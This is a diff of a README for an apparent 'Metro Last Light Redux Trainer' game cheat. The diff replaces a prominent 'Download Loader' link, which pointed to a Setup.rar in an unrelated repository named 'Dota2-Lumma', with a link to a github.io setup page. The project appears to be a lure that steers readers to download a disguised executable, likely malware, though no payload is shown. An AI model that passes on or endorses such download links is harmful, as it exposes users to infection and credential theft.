@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Metro Last Light Redux Trainer
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,5 +38,6 @@ configs/
 `Metro-Last-Light-Redux-Trainer` · Updated: 2026-11-02
 
 **Tags:** `metro-last-light` `metro-redux` `fps`
+
 
 
